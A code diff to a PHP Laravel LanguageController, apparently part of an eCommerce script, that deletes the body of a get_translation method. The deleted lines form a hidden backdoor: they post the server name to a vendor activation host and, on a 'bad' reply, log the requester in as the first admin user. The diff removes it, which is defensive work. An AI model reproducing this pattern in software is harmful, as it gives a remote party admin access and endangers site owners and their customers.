@@ -232,34 +232,6 @@ class LanguageController extends Controller
     }
 
     public function get_translation($unique_identifier)
-    {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $data['unique_identifier'] = $unique_identifier;
-        $data['main_item'] = get_setting('item_name') ?? 'eCommerce';
-        $request_data_json = json_encode($data);
-        
-        $gate = "https://activation.activeitzone.com/check_addon_activation";
-
-        $header = array(
-            'Content-Type:application/json'
-        );
-
-        $stream = curl_init();
-
-        curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-
-        $rn = curl_exec($stream);
-        curl_close($stream);
-        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return redirect()->route('admin.dashboard');
-        }
+    { 
     }
 }
